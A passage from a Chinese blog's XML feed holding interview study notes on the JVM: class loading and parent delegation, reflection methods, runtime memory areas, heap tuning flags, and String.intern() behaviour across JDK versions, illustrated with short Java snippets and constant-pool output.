alt></p><p>4.DNS负载均衡</p><p>当一个网站有足够多的用户的时候，假如每次请求的资源都位于同一台机器上面，那么这台机器随时可能会蹦掉。处理办法就是用DNS负载均衡技术，它的原理是在DNS服务器中为同一个主机名配置多个IP地址,在应答DNS查询时,DNS服务器对每个查询将以DNS文件中主机记录的IP地址按顺序返回不同的解析结果,将客户端的访问引导到不同的机器上去,使得不同的客户端访问不同的服务器,从而达到负载均衡的目的｡例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM</title>
      <link href="/2020/03/29/JVM/"/>
      <url>/2020/03/29/JVM/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了常考的JVM考点</p><a id="more"></a><!-- toc --><ul><li><a href="#对java的理解">对Java的理解</a></li><li><a href="#compile-once-run-anywhere如何实现">Compile Once, Run Anywhere如何实现</a></li><li><a href="#为什么jvm不直接将源码解析成机器码去执行">为什么JVM不直接将源码解析成机器码去执行</a></li><li><a href="#jvm如何加载class文件">JVM如何加载.class文件</a></li><li><a href="#反射">反射</a><ul><li><a href="#获取构造函数">获取构造函数</a></li><li><a href="#获取修饰符">获取修饰符</a></li><li><a href="#获取名字">获取名字</a></li><li><a href="#获取字段属性">获取字段（属性）</a></li><li><a href="#获取方法">获取方法</a></li><li><a href="#设置访问属性">设置访问属性</a></li><li><a href="#使用方法">使用方法</a></li></ul></li><li><a href="#类从编译到执行的过程">类从编译到执行的过程</a></li><li><a href="#谈谈classloader">谈谈ClassLoader</a></li><li><a href="#classloader的种类">ClassLoader的种类</a></li><li><a href="#类加载器双亲委派模型">类加载器双亲委派模型</a><ul><li><a href="#为什么要使用双亲委派模型">为什么要使用双亲委派模型</a></li><li><a href="#为什么需要破坏双亲委派">为什么需要破坏双亲委派？</a></li></ul></li><li><a href="#类的加载方式">类的加载方式</a><ul><li><a href="#两种类加载方式的区别">两种类加载方式的区别：</a></li><li><a href="#forname和loadclass的区别">forName和loadCLass的区别：</a></li></ul></li><li><a href="#java内存模型">Java内存模型</a><ul><li><a href="#内存简介">内存简介</a></li><li><a href="#地址空间的划分">地址空间的划分</a></li><li><a href="#jvm内存模型">JVM内存模型</a><ul><li><a href="#程序计数器program-counter-register">程序计数器（Program Counter Register）</a></li><li><a href="#java虚拟机栈stack">Java虚拟机栈（Stack）</a><ul><li><a href="#递归为什么会引发javalangstackoverflowerror异常">递归为什么会引发java.lang.StackOverflowError异常</a></li></ul></li><li><a href="#本地方法栈">本地方法栈</a></li><li><a href="#元空间与永久代">元空间与永久代</a><ul><li><a href="#metaspace相比permgen的优势">MetaSpace相比PermGen的优势</a></li></ul></li><li><a href="#java堆heap">Java堆（Heap）</a></li><li><a href="#java三大性能调优参数-xms-xmx-xss的含义">Java三大性能调优参数-Xms –Xmx –Xss的含义</a></li><li><a href="#java内存模型中堆和栈的区别-内存分配策略-">Java内存模型中堆和栈的区别-内存分配策略【-】</a></li><li><a href="#元空间-堆-线程独占部分间的联系-内存角度">元空间、堆、线程独占部分间的联系-内存角度【】</a></li><li><a href="#不同jdk版本间intern方法的区别">不同JDK版本间intern()方法的区别</a></li></ul></li></ul></li><li><a href="#引入">引入</a></li><li><a href="#字面量和运行时常量池">字面量和运行时常量池</a><ul><li><a href="#补充">补充:</a></li></ul></li><li><a href="#new-string创建了几个对象">new String创建了几个对象</a></li><li><a href="#运行时常量池的动态扩展">运行时常量池的动态扩展</a></li><li><a href="#intern-的正确用法">intern 的正确用法</a></li><li><a href="#总结">总结</a></li></ul><!-- tocstop --><h2><span id="对java的理解">对Java的理解</span></h2><table><thead><tr><th align="center">平台无关性</th><th align="center">面向对象</th></tr></thead><tbody><tr><td align="center">GC</td><td align="center">类库</td></tr><tr><td align="center">语言特性</td><td align="center">异常处理</td></tr></tbody></table><p><img src="image-20200329101756779.png" alt></p><h2><span id="compile-once-run-anywhere如何实现">Compile Once, Run Anywhere如何实现</span></h2><p>Javap是jdk自带的反汇编器，可以查看java编译器为我们生成的字节码。                               </p><p><img src="image-20200329101856128.png" alt></p><p><img src="image-20200329101916755.png" alt></p><ul><li><p>Java源码会被编译成字节码文件，再由不同平台的JVM解析</p></li><li><p>Java语言在不同平台上运行时不需要重新编译</p></li><li><p>JVM在执行字节码时会将其转换为具体平台的机器指令</p></li></ul><h2><span id="为什么jvm不直接将源码解析成机器码去执行">为什么JVM不直接将源码解析成机器码去执行</span></h2><ul><li><p>装备工作：每次执行都需要各种检查</p></li><li><p>生成字节码过程中，编译器可以预先作语法错误或者安全性方面的检查，出错机会更少</p></li><li><p>兼容性：也可以将别的语言解析成字节码</p></li></ul><h2><span id="jvm如何加载class文件">JVM如何加载.class文件</span></h2><p>主要有 装载、链接和初始化 </p><p>JVM通过ClassLoader加载class字节码文件，生成Class对象</p><ul><li><p>校验：检查加载文件的正确性和安全性</p></li><li><p>准备：给类中的静态变量分配存储空间。</p></li><li><p>解析：将常量池内的符号引用转换为直接引用</p></li></ul><p>初始化：对静态变量和静态代码块执行初始化工作</p><p><img src="image-20200329102811874.png" alt></p><h2><span id="反射">反射</span></h2><p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象都能调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制</p><p> <img src="image-20200329103352571.png" alt>                             </p><p> <img src="image-20200329103359919.png" alt></p><h3><span id="获取构造函数">获取构造函数</span></h3><p>　　　getDeclaredConstructors();　　　　获取所有的构造函数</p><p>　　　getDeclaredConstructor(参数类型);　　这个方法会返回制定参数类型的</p><p>所有构造器，<strong>包括</strong>public的和非public的，当然也包括private的。</p><p>　　　getConstructors();　　　　　　　　　　获取所有公开的构造函数</p><p>　　　getConstructor(参数类型);　　　　　　　　获取单个公开的构造函数</p><h3><span id="获取修饰符">获取修饰符</span></h3><p>　　　getModifiers();　　//获取所有修饰符</p><p>　　　返回类型：整数类型，如果有两个修饰符，则返回两个修饰符之和，例如public  static void getAll(){  }</p><p>　　　返回值会是public和static之和</p><p>　　　整数定义：</p><p>　　　0–默认不写 1–public 2–private 4–protected<br> 　　8–static 16–final 32–synchronized<br> 　　64–volatile 128–transient 256–native<br> 　　512–interface 1024–abstract</p><h3><span id="获取名字">　获取名字</span></h3><p>　　　返回类型：String,可以反射类名，方法名，构造函数名等等</p><p>　　　getName();　　　　//获取全名 例如：com.bean.Book</p><p>　　　getSimpleName()　　//获取类名 例如：Book</p><h3><span id="获取字段属性">获取字段（属性）</span></h3><p>　　　getFields()　　　//返回一个Field类型数组，其中包含当前类的public字段，如果此类继承于某个父类，同时包括父类的public字段。其它的proteced和private字段，无论是属于当前类还是父类都不被此方法获取。</p><p>　　　getField(String name)　　//参数可以指定字段　　获取单个public字段</p><p>　　　</p><p>　　　getDeclaredFields()　　//返回一个Field类型数组，结果包含当前类的所有字段，private、protected、public或者无修饰符都在内。另外，此方法返回的结果不包括父类的任何字段。 此方法只是针对当前类的。</p><p>　　　getDeclaredField(String name)　　//获取单个字段 参数可以指定字段</p><h3><span id="获取方法">　获取方法</span></h3><p>　　　getMethods()　　//<strong>返回当前Class对象表示的类或接口的所有公有成员方法对象数组,包括已声明的和从父类继承或实现接口的方法</strong>　　　getMethod(String name)　　//获取单个公开的方法，参数是可以指定方法名</p><p>　    getDeclaredMethods()　　　//获取所有的方法</p><p>　　　注意：它不会获取系统自带的方法，<strong>不</strong>包括从父类继承和接口实现的方法</p><p>getDeclaredMethod(String name)　　　 //获取单个的所有方法　参数是可指定方法名</p><h3><span id="设置访问属性">　设置访问属性</span></h3><p>　　　clz.setAccessible(true)　　//可访问</p><p>　　　clz.setAccessible(false)　　//不可访问</p><h3><span id="使用方法">使用方法</span></h3><p>　　　method.invoke(Object obj,Object… args)</p><p>　　　obj：如果是实例方法，则放个该方法的类对象给它</p><p>　　　obj：静态方法，写null</p><p>　　　args：方法的参数值，没有写null，或不写都行 </p><h2><span id="类从编译到执行的过程">类从编译到执行的过程</span></h2><p>Ø 编译器将Robot.java源文件编译为Robot.class字节码文件</p><p>Ø ClassLoader将字节码转换为JVM中的Class<robot>对象</robot></p><p>Ø JVM利用class<robot>对象实例化为Robot对象</robot></p><h2><span id="谈谈classloader">谈谈ClassLoader</span></h2><p>它主要工作在Class装载的加载阶段，所有的Class都是由ClassLoader进行加载的，其主要作用是从系统外部获得Class二进制数据流，然后交给JVM进行链接、初始化等操作。</p><h2><span id="classloader的种类">ClassLoader的种类</span></h2><p>Ø BootStrapClassLoader：C++编写，加载核心库java.*</p><p>Ø ExtClassLoader：Java编写，加载扩展库Javax.*</p><p>Ø AppClassLoader：Java编写，加载程序所在目录</p><p>Ø 自定义ClassLoader：java编写，定制化加载 </p><h2><span id="类加载器双亲委派模型">类加载器双亲委派模型</span></h2><p><img src="image-20200329105409059.png" alt></p><p>自底向上看如果曾经加载过，就直接返回。如果没有就向上委派给父类加载器。</p><p>最终到Bootstrap ClassLoader，如果它也没有，则进入Load JRE\lib\rt.jar或者-Xbootclasspath</p><p>（这个就是命令行输入-jar 接上jar包，接上的参数）选项指定的jar包中寻找。</p><p>如果没有找到，就向下继续寻找。</p><p><img src="image-20200329105647977.png" alt></p><p>为什么它们都是extends URLClassLoader却能保证父类的继承关系：即custom父类是app，app父类是ext</p><p><img src="image-20200329105703238.png" alt></p><p>Ext的parent是空，bootstrap clsloader是c++的</p><h3><span id="为什么要使用双亲委派模型">为什么要使用双亲委派模型</span></h3><p>以System举例，如果类a打印了一句话加载了System的字节码，类b也打印一句话反复加载已加载的字节码，就会造成内存的浪费。</p><p> 采用双亲委派的一个好处是比如加载位于rt.jar包中的类java.lang.Object，不管是哪个加载器加载这个类，最终都是委托给顶层的启动类加载器进行加载，这样就保证了使用不同的类加载器最终得到的都是同样一个Object对象。</p><h3><span id="为什么需要破坏双亲委派">为什么需要破坏双亲委派？</span></h3><p>因为在某些情况下父类加载器需要委托子类加载器去加载class文件。受到加载范围的限制，父类加载器无法加载到需要的文件，以Driver接口为例，由于Driver接口定义在jdk当中的，而其实现由各个数据库的服务商来提供，比如mysql的就写了<code>MySQL Connector</code>，那么问题就来了，DriverManager（也由jdk提供）要加载各个实现了Driver接口的实现类，然后进行管理，但是DriverManager由启动类加载器加载，只能记载JAVA_HOME的lib下文件，而其实现是由服务商提供的，由系统类加载器加载，这个时候就需要启动类加载器来委托子类来加载Driver实现，从而破坏了双亲委派，这里仅仅是举了破坏双亲委派的其中一个情况。</p><h2><span id="类的加载方式">类的加载方式</span></h2><p>Ø 隐式加载 new</p><p>Ø 显式加载 loadClass，forName等</p><ul><li>第一种：使用Class.forName(String classPath)　　//ClassPath：写需要反射的类名，一般是以包名.类名</li></ul><p>注意事项：这里会产生一个ClassNotFoundException异常，我们需要将异常处理或者抛出</p><p>返回值：Class对象</p><p>​                               </p><ul><li>第二种：直接使用Class clz = 类名.class</li></ul><p>这种情况一般在我们知道有这个类的时候去使用</p><ul><li>第三种：Class clz = 对象. getClass();</li></ul><p>　前提是对象已经被实例化出来了 </p><h3><span id="两种类加载方式的区别">两种类加载方式的区别：</span></h3><p>Ø 隐式加载能够直接获取对象的实例，而显式加载需要调用 Class 对象的 newInstance() 方法来生成对象的实例。</p><p>Ø 隐式加载能够使用有参的构造函数，而使用 Class 对象的 newInstance() 不支持传入参数，如果想使用有参的构造函数，必须通过反射的方式，来获取到该类的有参构造方法。</p><h3><span id="forname和loadclass的区别">forName和loadCLass的区别：</span></h3><p>Ø 使用 loadClass() 方法获得的 Class 对象只完成了类装载过程中的第一步：加载，后续的操作均未进行。（还没有链接的）</p><p>Ø 使用 Class.forName() 方法获得 Class 对象是已经执行完初始化的了</p><h2><span id="java内存模型">Java内存模型</span></h2><h3><span id="内存简介">内存简介</span></h3><p><img src="image-20200329112332929.png" alt></p><h3><span id="地址空间的划分">地址空间的划分</span></h3><p><img src="image-20200329112347172.png" alt></p><h3><span id="jvm内存模型">JVM内存模型</span></h3><p><img src="image-20200329112436551.png" alt></p><h4><span id="程序计数器program-counter-register">程序计数器（Program Counter Register）</span></h4><p>Ø 当前线程所执行的字节码行号指示器（逻辑）</p><p>Ø 改变计数器的值来选取下一条需要执行的字节码指令</p><p>Ø 和线程是一对一的关系即“线程私有”</p><p>Ø 对Java方法计数，如果是Native方法则计数器值为Undefined</p><p>Ø 不会发生内存泄漏</p><h4><span id="java虚拟机栈stack">Java虚拟机栈（Stack）</span></h4><p><img src="image-20200329112546740.png" alt>                            </p><ul><li><p>Java虚拟机栈保存的主要内容为栈帧，每一次函数调用，都会有一个对应的栈帧被压入java栈，每一个函数调用结束，都会有一个栈帧被弹出java栈。</p></li><li><p>栈帧包含：本地变量表、操作数栈、返回地址等</p></li><li><p>虚拟机提供参数<strong>-Xss</strong>来指定线程的最大栈空间，决定了函数调用的最大深度。 </p></li></ul><p>Java 虚拟机栈会出现两种异常：StackOverFlowError 和 OutOfMemoryError。</p><ul><li><p>StackOverFlowError 若 Java 虚拟机栈的大小不允许动态扩展，那么当线程请求栈的深度超过当前 Java 虚拟机栈的最大深度时，抛出 StackOverFlowError 异常。</p></li><li><p>OutOfMemoryError 若允许动态扩展，那么当线程请求栈时内存用完了，无法再动态扩展时，抛出 OutOfMemoryError 异常。</p><p><img src="image-20200329112911648.png" alt></p><p><img src="image-20200329113050542.png" alt></p><p><img src="image-20200329113102131.png" alt></p><p><img src="image-20200329113112976.png" alt></p><p><img src="image-20200329113122285.png" alt></p></li></ul><p>Iconst_0 是将int值0压入操作栈中，</p><p>Istone_2 是将操作数栈顶的元素(0)pop出来，存入局部变量表的第2个（0,1,2）位置中</p><p>Iload_0 将局部变量表的第0个元素压入操作数栈中</p><p>Iload_1 将局部变量表的第1个元素压入操作数栈中，由于是栈，所以2在1的上面。</p><p>Iadd 将操作数栈的元素弹出，然后相加后压入栈顶</p><p>Istore2 就是将栈顶的元素弹出放入局部变量表第2个位置中</p><p>iload_2 将局部变量中第2个元素压入操作数栈 </p><p>ireturn 返回操作数栈顶元素。</p><p>返回后所有栈帧销毁</p><p><font color="red">栈的内存不需要GC回收，自动销毁（运行完就回收了）。</font></p><p> <img src="image-20200329113455603.png" alt></p><h5><span id="递归为什么会引发javalangstackoverflowerror异常">递归为什么会引发java.lang.StackOverflowError异常</span></h5><p>栈帧数超过虚拟机栈深度</p><p> <img src="image-20200329113511734.png" alt></p><p><img src="image-20200329113520222.png" alt></p><h4><span id="本地方法栈">本地方法栈</span></h4><p>Ø 与虚拟机栈相似，主要作用于标注了native的方法</p><h4><span id="元空间与永久代">元空间与永久代</span></h4><p>它们都是Java方法区的实现</p><p>元空间使用本地内存，永久代使用的是jvm内存 </p><p><img src="image-20200329113534717.png" alt></p><h5><span id="metaspace相比permgen的优势">MetaSpace相比PermGen的优势</span></h5><p>Ø 字符串常量池存在永久代中，容易出现性能问题和内存溢出</p><p>Ø 类和方法的信息大小难以确定，给永久代的大小指定带来困难</p><p>Ø 永久代会为GC带来不必要的复杂性（永久代在堆中）</p><p>Ø 方便HotSpot与其他JVM如Jrockit的集成</p><h4><span id="java堆heap">Java堆（Heap）</span></h4><p><img src="image-20200329113548468.png" alt></p><h4><span id="java三大性能调优参数-xms-xmx-xss的含义">Java三大性能调优参数-Xms –Xmx –Xss的含义</span></h4><p>Ø -Xss：规定了每个线程虚拟机栈（堆栈）的大小</p><p>Ø -Xms：堆的初始值</p><p>Ø -Xmx：堆能达到的最大值</p><p>一般会让-Xms=-Xmx因为，当heap不够用而发生扩容时会发生内存抖动，影响程序运行时的稳定性。</p><h4><span id="java内存模型中堆和栈的区别-内存分配策略-">Java内存模型中堆和栈的区别-内存分配策略【-】</span></h4><p>Ø 静态存储：编译时确定每个数据目标在运行时的存储空间需求</p><p>Ø 栈式存储：数据区需求在编译时未知，运行时模块入口前确定</p><p>Ø 堆式存储：编译时或运行时模块入口都无法确定，动态分配</p><p>​    <img src="image-20200329113633980.png" alt>                   </p><p>Ø 管理方式：栈自动释放，堆需要GC</p><p>Ø 空间大小：栈比堆小</p><p>Ø 碎片相关：栈产生的碎片远小于堆</p><p>Ø 分配方式：栈支持静态和动态分配，而堆仅支持动态分配</p><p>Ø 效率：栈的效率比堆高</p><h4><span id="元空间-堆-线程独占部分间的联系-内存角度">元空间、堆、线程独占部分间的联系-内存角度【】</span></h4><p><img src="image-20200329113803997.png" alt></p><p><img src="image-20200329113811855.png" alt></p><p><img src="image-20200329113830564.png" alt></p><p><img src="image-20200329113837079.png" alt></p><p><img src="image-20200329113848685.png" alt></p><h4><span id="不同jdk版本间intern方法的区别">不同JDK版本间intern()方法的区别</span></h4><p><img src="image-20200329113858806.png" alt></p><p><img src="image-20200329113905280.png" alt></p><p><img src="image-20200329113918059.png" alt></p><p><strong>JDK8中</strong></p><p>False</p><p>True</p><p><strong>JDK6中：</strong></p><p>FALSE</p><p>FALSE</p><p><img src="image-20200329113929389.png" alt></p><p>在JDK1.6中所有的输出结果都是 false，因为JDK1.6以及以前版本中，常量池是放在 Perm 区（属于方法区）中的，熟悉JVM的话应该知道这是和堆区完全分开的。</p><p>使用<font color="red">引号声明的字符串都是会直接在字符串常量池</font>中生成的，而 new 出来的 String 对象是放在堆空间中的。所以两者的内存地址肯定是不相同的，即使调用了intern()方法也是不影响的。如果不清楚String类的“==”和equals()的区别可以查看我的这篇博文Java面试——从Java堆、栈角度比较equals和==的区别。</p><p>intern()方法在JDK1.6中的作用是：比如String s = new String(“SEU_Calvin”)，再调用s.intern()，此时返回值还是字符串”SEU_Calvin”，表面上看起来好像这个方法没什么用处。但实际上，在JDK1.6中它做了个小动作：检查字符串池里是否存在”SEU_Calvin”这么一个字符串，如果存在，就返回池里的字符串；如果不存在，该方法会把”SEU_Calvin”添加到字符串池中，然后再返回它的引用。然而在JDK1.7中却不是这样的，后面会讨论。</p><p>下面代码</p><p>两个new string就会在heap中生成一个aa，然后intern将aa的副本放入常量池中，由于是副本所以指针也不一样，因此还是false；</p><p><strong>JDK1.7以上</strong></p><p><img src="image-20200329113945392.png" alt></p><p>String s = newString(“1”)，生成了常量池中的“1” 和堆空间中的字符串对象。</p><p>s.intern()，这一行的作用是s对象去常量池中寻找后发现”1”已经存在于常量池中了。</p><p>String s2 = “1”，这行代码是生成一个s2的引用指向常量池中的“1”对象。</p><p>结果就是 s 和 s2 的引用地址明显不同。因此返回了false。</p><p>String s3 = new String(“1”) + newString(“1”)，这行代码在字符串常量池中生成“1” ，并在堆空间中生成s3引用指向的对象（内容为”11”）。注意此时常量池中是没有 “11”对象的。</p><p>s3.intern()，这一行代码，是将 s3中的“11”字符串放入 String 常量池中，此时常量池中不存在“11”字符串，JDK1.6的做法是直接在常量池中生成一个 “11” 的对象。</p><p><font color="red">但是在JDK1.7中，常量池中不需要再存储一份对象了，可以直接存储堆中的引用。这份引用直接指向 s3 引用的对象，也就是说s3.intern() ==s3会返回true。</font>&gt;</p><p>String s4 = “11”， 这一行代码会直接去常量池中创建，但是发现已经有这个对象了，此时也就是指向 s3 引用对象的一个引用。因此s3 == s4返回了true。</p><p> 看例1：<br>  String s0=”kvill”;<br>  String s1=”kvill”;<br>  String s2=”kv” + “ill”;<br>  System.out.println( s0==s1 );<br>  System.out.println( s0==s2 );<br>  结果为：<br>  true<br>  true</p><p> 看例2：</p><p>  String s0=”kvill”;</p><p>  String s1=new String(”kvill”);</p><p>  String s2=”kv” + new String(“ill”);</p><p>  System.out.println( s0==s1 );</p><p>  System.out.println( s0==s2 );</p><p>  System.out.println( s1==s2 );</p><p>  结果为：</p><p>  false</p><p>  false</p><p>  false</p><p>  例2中s0还是常量池中”kvill”的应用，s1因为无法在编译期确定，所以是运行时创建的新对象”kvill”的引用，s2因为有后半部分new String(“ill”)所以也无法在编译期确定，所以也是一个新创建对象”kvill”的应用;明白了这些也就知道为何得出此结果了。</p><p><strong>例如：</strong></p><p>String str1=”ABC”； 和String str2 = new String(“ABC”); </p><p><strong>String str1=”ABC”</strong> <strong>可能创建一个对象或者不创建对象，如果”ABC”这个字符串在</strong>JavaString<strong>池里不存在，会在</strong>JavaString池创建这个一个String对象(“ABC”).如果已经存在，str1直接reference to这个String池里的对象。<strong>String str2 = new String(“ABC”)</strong> 至少创建一个对象，也可能两个。因为用到new关键字，会在heap创建一个 <strong>str2</strong> 的String <strong>对象，它的</strong>value <strong>是</strong> <strong>“ABC”.*</strong>同时，如果”ABC”这个字符串在java String池里不存在，会在java String池创建这个一个String对象(“ABC”).</p><h2><span id="引入">引入</span></h2><p>String，是 Java 中除了基本数据类型以外，最为重要的一个类型了。很多人会认为他比较简单。但是和 String 有关的面试题有很多，下面我随便找两道面试题，看看你能不能都答对：</p><p> Q1：<code>String s = new String(&quot;hollis&quot;);</code>定义了几个对象。<br> Q2：如何理解 <code>String.intern()</code>方法？<br> 上面这两个是面试题和 String 相关的比较常考的，很多人一般都知道答案。</p><p> A1：若常量池中已经存在 “hollis”，则直接引用，也就是此时只会创建一个对象，如果常量池中不存在 “hollis”，则先创建后引用，也就是有两个。<br> A2：当一个 String 实例调用intern()方法时，JVM 会查找常量池中是否有相同 Unicode 的字符串常量，如果有，则返回其的引用，如果没有，则在常量池中增加一个 Unicode 等于 str 的字符串并返回它的引用；<br> 两个答案看上去没有任何问题，但是，仔细想想好像哪里不对呀。</p><p>按照上面的两个面试题的回答，就是说 new String 会检查常量池，如果有的话就直接引用，如果不存在就要在常量池创建一个，那么还要 intern 干啥？难道以下代码是没有意义的吗？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String s = <span class="keyword">new</span> String(<span class="string">"Hollis"</span>).intern();        <span class="number">1</span></span><br></pre></td></tr></table></figure><p>如果，每当我们使用 new 创建字符串的时候，都会到字符串池检查，然后返回。那么以下代码也应该输出结果都是 true?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String s1 = <span class="string">"Hollis"</span>;</span><br><span class="line">String s2 = <span class="keyword">new</span> String(<span class="string">"Hollis"</span>);</span><br><span class="line">String s3 = <span class="keyword">new</span> String(<span class="string">"Hollis"</span>).intern();</span><br><span class="line"></span><br><span class="line">System.out.println(s1 == s2);</span><br><span class="line">System.out.println(s1 == s3);</span><br></pre></td></tr></table></figure><p>但是，以上代码输出结果为（base jdk1.8.0_73）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">false</span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>不知道聪明的读者看完这段代码之后，是不是有点被搞蒙了，到底是怎么回事儿？</p><p>别急，且听我慢慢道来。</p><h2><span id="字面量和运行时常量池">字面量和运行时常量池</span></h2><p>JVM 为了提高性能和减少内存开销，在实例化字符串常量的时候进行了一些优化。为了减少在 JVM 中创建的字符串的数量，字符串类维护了一个字符串常量池。</p><p>在 JVM 运行时区域的方法区中，有一块区域是运行时常量池，主要用来存储编译期生成的各种字面量和符号引用。</p><p>了解 Class 文件结构或者做过 Java 代码的反编译的朋友可能都知道，在 java 代码被 javac 编译之后，文件结构中是包含一部分 Constant pool 的。比如以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    String s = <span class="string">"Hollis"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过编译后，常量池内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Constant pool:</span><br><span class="line">#1 = Methodref          #4.#20         // java/lang/Object."&lt;init&gt;":()V</span><br><span class="line">#2 = String             #21            // Hollis</span><br><span class="line">#3 = Class              #22            // StringDemo</span><br><span class="line">#4 = Class              #23            // java/lang/Object</span><br><span class="line">...</span><br><span class="line">#16 = Utf8               s</span><br><span class="line">..</span><br><span class="line">#21 = Utf8               Hollis</span><br><span class="line">#22 = Utf8               StringDemo</span><br><span class="line">#23 = Utf8               java/lang/Object</span><br></pre></td></tr></table></figure><p>上面的 Class 文件中的常量池中，比较重要的几个内容：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#16 = Utf8               s</span><br><span class="line">#21 = Utf8               Hollis</span><br><span class="line">#22 = Utf8               StringDemo</span><br></pre></td></tr></table></figure><p>上面几个常量中，s 就是前面提到的<strong>符号引用</strong>，而 Hollis 就是前面提到的<strong>字面量</strong>。而 Class 文件中的常量池部分的内容，会在运行期被运行时常量池加载进去。关于字面量，详情参考 Java SE Specifications。</p><h4><span id="补充">补充:</span></h4><p><strong>字面量</strong>是指由字母，数字等构成的字符串或者数值，它只能作为右值出现，所谓右值是指等号右边的值，如：int a=123这里的a为左值，123为右值。</p><p><strong>常量</strong>和<strong>变量</strong>都属于<strong>变量</strong>，只不过常量是赋过值后不能再改变的变量，而普通的变量可以再进行赋值操作。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a;<span class="comment">//a变量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> b=<span class="number">10</span>;<span class="comment">//b为常量,10为字面量</span></span><br><span class="line">string str=<span class="string">"hello world"</span>;<span class="comment">//str为变量,hello world为字面量</span></span><br></pre></td></tr></table></figure><h2><span id="new-string创建了几个对象">new String创建了几个对象</span></h2><p>下面，我们可以来分析下 <code>String s = new String(&quot;Hollis&quot;);</code> 创建对象情况了。</p><p>这段代码中，我们可以知道的是，在编译期，符号引用 s 和字面量 Hollis 会被加入到 Class 文件的常量池中，然后在类加载阶段，这两个常量会进入常量池。</p><p>但是，这个“进入”过程，并不会直接把所有类中定义的常量全部都加载进来，而是会做个比较，如果需要加到字符串常量池中的字符串已经存在，那么就不需要再把字符串字面量加载进来了。</p><p>所以，当我们说&lt;若常量池中已经存在 “hollis”，则直接引用，也就是此时只会创建一个对象&gt;说的就是这个字符串字面量在字符串池中被创建的过程。</p><p>说完了编译期的事儿了，该到运行期了，在运行期，new String(“Hollis”);执行到的时候，是要在 Java 堆中创建一个字符串对象的，而这个对象所对应的字符串字面量是保存在字符串常量池中的。但是，String s = new String(“Hollis”);，对象的符号引用 s 是保存在Java虚拟机栈上的，他保存的是堆中刚刚创建出来的的字符串对象的引用。</p><p>所以，你也就知道以下代码输出结果为 false 的原因了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String s1 = <span class="keyword">new</span> String(<span class="string">"Hollis"</span>);</span><br><span class="line">String s2 = <span class="keyword">new</span> String(<span class="string">"Hollis"</span>);</span><br><span class="line">System.out.println(s1 == s2);</span><br></pre></td></tr></table></figure><p>因为，== 比较的是 s1 和 s2 在堆中创建的对象的地址，当然不同了。但是如果使用 equals，那么比较的就是字面量的内容了，那就会得到 true。</p><p><img src="JVM/image-20200329114023475.png" alt="image-20200329114023475"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不同版本的JDK中，Java堆和字符串常量池之间的关系也是不同的，这里为了方便表述，就画成两个独立的物理区域了。具体情况请参考Java虚拟机规范。         1</span><br></pre></td></tr></table></figure><p>上图中 s1 和 s2 是两个完全不同的对象，在堆中有自己的内存空间，当然不相等了。</p><p>所以，<code>String s = new String(&quot;Hollis&quot;);</code>创建几个对象的答案你也就清楚了。</p><p>常量池中的“对象”是在编译期就确定好了的，在类被加载的时候创建的，如果类加载时，该字符串常量在常量池中已经有了，那这一步就省略了。堆中的对象是在运行期才确定的，在代码执行到 new 的时候创建的。</p><h2><span id="运行时常量池的动态扩展">运行时常量池的动态扩展</span></h2><p><strong>编译期</strong>生成的各种字面量和符号引用是运行时常量池中比较重要的一部分来源，但是并不是全部。那么还有一种情况，可以在运行期像运行时常量池中增加常量。那就是 String 的intern方法。</p><p>当一个String实例调用<code>intern()</code>方法时，JVM 会查找常量池中是否有相同 Unicode 的字符串常量，如果有，则返回其的引用，如果没有，则在常量池中增加一个 Unicode 等于 str 的字符串并返回它的引用；</p><p><code>intern()</code>有两个作用，<strong>第一个是将字符串字面量放入常量池（如果池没有的话），第二个是返回这个常量的引用。</strong></p><p>我们再来看下开头的那个让人产生疑惑的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String s1 = <span class="string">"Hollis"</span>;</span><br><span class="line">String s2 = <span class="keyword">new</span> String(<span class="string">"Hollis"</span>);</span><br><span class="line">String s3 = <span class="keyword">new</span> 